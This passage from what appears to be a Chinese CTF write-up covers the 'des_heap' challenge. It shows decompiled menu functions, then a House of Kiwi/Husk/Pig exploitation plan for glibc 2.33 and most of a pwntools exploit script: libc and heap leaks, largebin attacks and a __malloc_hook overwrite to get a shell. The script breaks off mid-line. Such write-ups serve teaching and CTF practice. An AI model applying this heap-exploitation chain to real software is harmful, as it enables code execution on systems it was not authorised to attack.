了一块可读可写的区域，用作我们自己的堆。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_121A</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( fd &lt; <span class="hljs-number">0</span> )<br>    error(<span class="hljs-string">&quot;File urandom Open Failed&quot;</span>);<br>  read(fd, &amp;buf, <span class="hljs-number">5uLL</span>);<br>  Heap_arena = (__int64)mmap((<span class="hljs-type">void</span> *)(buf &amp; <span class="hljs-number">0xFFFFFFFFF000</span>LL), <span class="hljs-number">0x3000</span>uLL, <span class="hljs-number">3</span>, <span class="hljs-number">34</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Add"><a class="header-anchor" href="#Add">¶</a>Add</h4><p><strong>calloc</strong> 就算了，这玩意 add 的时候没有给 👴 输入数据的机会，👴 有点难受。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_14A9</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  buf = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, v1);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Edit"><a class="header-anchor" href="#Edit">¶</a>Edit</h4><p>只要在 mmap 分配的堆上，👴 想 edit 哪里，就 edit 哪里。主要这个 <strong>my_read</strong> 遇到 <strong>‘\x0a’</strong> 会截断，稍微注意一下就行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1513</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0x1000</span> )<br>    error(<span class="hljs-string">&quot;Invalid size Receviced&quot;</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;offset: &quot;</span>, <span class="hljs-number">8uLL</span>);<br>  v2 = get_int();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v2 &gt;= <span class="hljs-number">0x2000</span> )<br>    error(<span class="hljs-string">&quot;Invalid offset Receviced&quot;</span>);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;content: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>  my_read(v2 + Heap_arena, v1);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Edit done\n&quot;</span>, <span class="hljs-number">0xA</span>uLL);<br>  <span class="hljs-keyword">return</span> v3 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Dele"><a class="header-anchor" href="#Dele">¶</a>Dele</h4><p>只要在 mmap 分配的堆上，👴 想 free 哪里，就 free 哪里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">Free</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;idx: &quot;</span>, <span class="hljs-number">6uLL</span>);<br>  v1 = get_int();<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v1 &gt;= <span class="hljs-number">0x3000</span> )<br>    error(<span class="hljs-string">&quot;Invalid idx Receviced&quot;</span>);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)(Heap_arena + v1));<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Show"><a class="header-anchor" href="#Show">¶</a>Show</h4><p>leak 的是 buf 内容，也就是我们 calloc 的堆块。对我们的堆布局提出了一些要求。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1688</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;content: &quot;</span>, <span class="hljs-number">9uLL</span>);<br>  v1 = <span class="hljs-built_in">strlen</span>(buf);<br>  write(<span class="hljs-number">1</span>, buf, v1);<br>  <span class="hljs-keyword">return</span> v2 - __readfsqword(<span class="hljs-number">0x28</span>u);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Exp-Kiwi-Husk-Pig-成链"><a class="header-anchor" href="#Exp-Kiwi-Husk-Pig-成链">¶</a>Exp.Kiwi -&gt; Husk -&gt; Pig 成链</h3><p>2.33 还是有 hook 的，Pig 是个不错的选择。</p><p><strong>思路介绍</strong></p><ol><li>简单布个局，有 UAF 我们很容易地 leak 出 libc。</li><li>再简单的拿个堆地址，整完事就把堆恢复回去，起码不要带个 unsorted 一直玩，容易出事。</li><li>构造出同一 idx 下的 Largebin 和 Unsortedbin，为 Largebin Attack 作准备。</li><li>Largebin Attack 开始乱 🐑 ，通常好一点的布局在有 Edit 的情况下，可以实现多次 Largebin Attak，👴 这是通常布局所以多次⑧是问题。</li><li>先打完 husk 的俩张表，在对应偏移处写 exit 函数。👴 这里拿的是 <strong>%s</strong> 也就是 $hex(ord(‘s’)*8)=0x398$ 。你拿 <strong>%u</strong> 也就是 <strong>0x3a8</strong> 也彳亍。</li><li>打 _IO_list_all，待会布置 _IO_FILE 链子。</li><li>打 main_arena 的 topchunk ，如果你想的话，去 leak 出真正的堆地址，然后错位打 size ，也 ⑧ 是不彳亍。</li><li>分配一个大堆块，<strong>Kiwi</strong> 里的 <strong>vfprintf</strong> 可以触发 <strong>Husk</strong> 进入 <strong>exit</strong>，然后在  <strong>_IO_flush_all_lockp</strong> 遍历我们的 IO 链子，实现 <strong>Pig</strong> 的手法。</li></ol><p><strong>IO 链解释</strong></p><p>👴 建议带 🔥 仔细跟一下 <strong>_IO_str_overflow</strong> 的汇编和源码。</p><ol><li>这里主要是用到了 <strong>_IO_str_overflow</strong> 里的非预期 <strong>malloc</strong> 堆块和 <strong>memcpy</strong>，结合我们的 <strong>TcachePoisoning</strong>，多次利用这个 trick，达到了任意写的功能。👴 这里扬掉了 <strong>__malloc_hook</strong> 。</li><li><strong>_IO_str_overflow</strong> 函数中会将我们 IO 结构体的 <strong>_IO_write_ptr</strong> 放到 <strong>rdx</strong>，利于高版本下的 <strong>setcontext+61</strong> 的绕沙盒操作。</li><li>因为这题没开沙箱，这里在堆地址上写 <code>/bin/sh\0</code>，在 <strong>__malloc_hook</strong> 写 system，把 <strong>malloc</strong> 的 size 控制成 $(bin_sh-100)//2$ 就可以 <strong>getshell</strong>。 栈迁移后经典 <strong>pop rdi,ret;bin_sh;system;</strong> 的布局当然也是欧尅的。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.32/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./des_heap&#x27;</span>)<br>debug()<br><span class="hljs-comment"># p = remote(&#x27;node4.buuoj.cn&#x27;,28897)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br>    sleep(<span class="hljs-number">0.03</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">offset,data,size=<span class="hljs-number">0x1000</span>-<span class="hljs-number">1</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;offset: &#x27;</span>,<span class="hljs-built_in">str</span>(offset))<br>    sla(<span class="hljs-string">&#x27;content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    menu(<span class="hljs-number">4</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                               Init Heap                               |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>add(<span class="hljs-number">0x100</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                 0x100*8 ---&gt; Full Tcache ,Leak libc                   |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span> <br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    chunk += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span><br>edit(<span class="hljs-number">0</span>,chunk)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span> + (<span class="hljs-number">7</span>-i)*<span class="hljs-number">0x100</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">0xf8</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># Bypass \x00 Leak libc</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>,<span class="hljs-number">0x11</span>) <br>show()<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br>rax = libc_base + <span class="hljs-number">0x0000000000044c70</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x0000000000112a51</span><br>syscall_ret = libc_base + <span class="hljs-number">0x000000000006105a</span><br>ret = libc_base + <span class="hljs-number">0x0000000000028a55</span> + <span class="hljs-number">1</span><br>read_addr = libc.sym.read<br>write_addr = libc.sym.write<br>__malloc_hook = libc.sym.__malloc_hook<br>__free_hook = libc.sym.__free_hook<br>system_addr = libc.sym.system<br><span class="hljs-comment"># bin_sh%1 == 1</span><br><span class="hljs-comment"># bin_sh = libc.search(&#x27;/bin/sh&#x27;).next() </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Husk</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>__printf_function_table = libc_base + <span class="hljs-number">0x1e35c8</span><br>__printf_arginfo_table = libc_base + <span class="hljs-number">0x1eb218</span><br>exit = libc.sym.exit<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Pig</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>_IO_list_all = libc_base + <span class="hljs-number">0x1e15c0</span><br>_IO_str_jumps = libc_base + <span class="hljs-number">0x1e2560</span><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Kiwi</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>top_chunk = libc_base + <span class="hljs-number">0x1e0c00</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                        Leak Heap,Recover Heap                         |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x101</span>)+<span class="hljs-string">&#x27;\x00&#x27;</span>,<span class="hljs-number">0x11</span>) <br>add(<span class="hljs-number">0x58</span>)<br>dele(<span class="hljs-number">0</span> + <span class="hljs-number">0x10</span>)<br>show()<br>ru(<span class="hljs-string">&#x27;content: &#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">4</span>))<br>heap_base = heap_leak &lt;&lt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>add(<span class="hljs-number">0x98</span>) <span class="hljs-comment"># 0xa0 + 0x60 = 0x100 Recover Heap</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|                   Largebin Attack Preparing.....                      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">&#x27;\0&#x27;</span> * <span class="hljs-number">0x420</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + <span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x421</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x410</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + <span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x10</span><br>lg(<span class="hljs-string">&#x27;LEN&#x27;</span>,<span class="hljs-built_in">len</span>(chunk))<br>edit(<span class="hljs-number">0x1000</span>,chunk)<br><br><br>dele(<span class="hljs-number">0x1000</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x10</span>)  <span class="hljs-comment"># Largebin</span><br>add(<span class="hljs-number">0x1000</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">|   Largebin Attack __printf_function_table&amp;__printf_arginfo_table      |</span><br><span class="hljs-string">|                                                                       |</span><br><span class="hljs-string">-------------------------------------------------------------------------</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>dele(<span class="hljs-number">0x1000</span> + <span 